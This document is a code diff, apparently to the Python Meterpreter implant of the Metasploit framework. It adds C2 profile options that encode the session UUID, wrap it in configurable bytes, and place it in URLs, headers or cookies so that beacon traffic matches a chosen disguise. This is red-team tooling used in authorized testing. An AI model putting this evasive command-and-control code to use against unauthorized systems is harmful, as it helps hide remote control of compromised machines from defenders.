@@ -177,7 +177,10 @@ TLV_TYPE_C2_CERT_HASH          = TLV_META_TYPE_RAW    | 717 # Expected SSL certi
 TLV_TYPE_C2_PREFIX             = TLV_META_TYPE_RAW    | 718 # Data to prepend to the outgoing payload
 TLV_TYPE_C2_SUFFIX             = TLV_META_TYPE_RAW    | 719 # Data to append to the outgoing payload
 TLV_TYPE_C2_ENC_INBOUND        = TLV_META_TYPE_UINT   | 720 # Server->client (response) body encoding
-TLV_TYPE_C2_ENC_OUTBOUND       = TLV_META_TYPE_UINT   | 728 # Client->server (request) body/metadata encoding
+TLV_TYPE_C2_ENC_OUTBOUND       = TLV_META_TYPE_UINT   | 728 # Client->server (request) body encoding (POST only)
+TLV_TYPE_C2_ENC_UUID           = TLV_META_TYPE_UINT   | 729 # Encoding applied to the UUID before placement
+TLV_TYPE_C2_UUID_PREFIX        = TLV_META_TYPE_RAW    | 730 # Bytes to prepend to the encoded UUID
+TLV_TYPE_C2_UUID_SUFFIX        = TLV_META_TYPE_RAW    | 731 # Bytes to append to the encoded UUID
 TLV_TYPE_C2_PREFIX_SKIP        = TLV_META_TYPE_UINT   | 721 # Size of prefix to skip (in bytes)
 TLV_TYPE_C2_SUFFIX_SKIP        = TLV_META_TYPE_UINT   | 722 # Size of suffix to skip (in bytes)
 TLV_TYPE_C2_UUID_COOKIE        = TLV_META_TYPE_STRING | 723 # Name of the cookie to put the UUID in
@@ -926,6 +929,9 @@ class Transport(object):
         opts['headers'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_HEADERS).get('value')
         opts['enc_inbound'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_ENC_INBOUND).get('value', C2_ENCODING_NONE)
         opts['enc_outbound'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_ENC_OUTBOUND).get('value', C2_ENCODING_NONE)
+        opts['enc_uuid'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_ENC_UUID).get('value', C2_ENCODING_NONE)
+        opts['uuid_prefix'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UUID_PREFIX).get('value', b'')
+        opts['uuid_suffix'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UUID_SUFFIX).get('value', b'')
         opts['prefix_skip'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_PREFIX_SKIP).get('value', 0)
         opts['suffix_skip'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_SUFFIX_SKIP).get('value', 0)
         opts['prefix'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_PREFIX).get('value')
@@ -1131,20 +1137,35 @@ class HttpTransport(Transport):
             return base64.urlsafe_b64decode(data)
         return data
 
+    @staticmethod
+    def _render_uuid(c2_opts, uuid):
+        """Apply the profile's UUID transform (encode + prepend + append)."""
+        if not uuid:
+            return ''
+        enc = c2_opts.get('enc_uuid', C2_ENCODING_NONE)
+        prefix = c2_opts.get('uuid_prefix') or b''
+        suffix = c2_opts.get('uuid_suffix') or b''
+        uuid_bytes = uuid.encode() if is_str(uuid) else uuid
+        encoded = HttpTransport._c2_encode(uuid_bytes, enc)
+        return (prefix + encoded + suffix).decode('latin-1')
+
     def _build_request_url(self, c2_opts, uuid=None):
         """Build the request URL using C2 profile options."""
-        # Start with the base URL (scheme://host:port)
+        # Start with the base URL (scheme://host:port) — the profile's
+        # per-verb `set uri` is the authoritative path, so LURI from
+        # self.url is intentionally discarded here.
         match = re.match(r'(https?://[^/]+)', self.url)
         base_url = match.group(1) if match else self.url
         uri = c2_opts.get('uri') or ''
         url = base_url + '/' + uri.lstrip('/')
 
+        rendered = self._render_uuid(c2_opts, uuid) if uuid else ''
         # No param/header/cookie placement => id is carried in the URI.
-        if uuid and c2_opts.get('uuid_get'):
+        if rendered and c2_opts.get('uuid_get'):
             separator = '&' if '?' in url else '?'
-            url = url + separator + c2_opts['uuid_get'] + '=' + uuid
-        elif uuid and not (c2_opts.get('uuid_header') or c2_opts.get('uuid_cookie')):
-            url = url.rstrip('/') + '/' + uuid
+            url = url + separator + c2_opts['uuid_get'] + '=' + rendered
+        elif rendered and not (c2_opts.get('uuid_header') or c2_opts.get('uuid_cookie')):
+            url = url.rstrip('/') + '/' + rendered
         return url
 
     def _build_request_headers(self, c2_opts, uuid=None):
@@ -1156,10 +1177,11 @@ class HttpTransport(Transport):
                 headers[p[0].strip()] = ':'.join(p[1:]).strip()
         if c2_opts.get('ua'):
             headers['User-Agent'] = c2_opts['ua']
-        if uuid and c2_opts.get('uuid_header'):
-            headers[c2_opts['uuid_header']] = uuid
-        if uuid and c2_opts.get('uuid_cookie'):
-            cookie_val = c2_opts['uuid_cookie'] + '=' + uuid
+        rendered = self._render_uuid(c2_opts, uuid) if uuid else ''
+        if rendered and c2_opts.get('uuid_header'):
+            headers[c2_opts['uuid_header']] = rendered
+        if rendered and c2_opts.get('uuid_cookie'):
+            cookie_val = c2_opts['uuid_cookie'] + '=' + rendered
             existing = headers.get('Cookie')
             headers['Cookie'] = existing + '; ' + cookie_val if existing else cookie_val
         return headers
@@ -1170,7 +1192,8 @@ class HttpTransport(Transport):
             return self.c2_uuid
         match = re.match(r'https?://[^/]+/(.*?)/?$', self.url)
         if match:
-            return match.group(1).split('/')[-1]
+            extracted = match.group(1).split('/')[-1]
+            return extracted
         return ''
 
     def _get_packet(self):
@@ -1216,7 +1239,7 @@ class HttpTransport(Transport):
                     pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF + PACKET_LENGTH_SIZE])[0] - 8
                     if len(packet) != (pkt_length + PACKET_HEADER_SIZE):
                         packet = None  # looks corrupt
-        except:
+        except Exception as e:
             debug_traceback('[-] failure to receive packet from ' + url)
 
         if not packet:
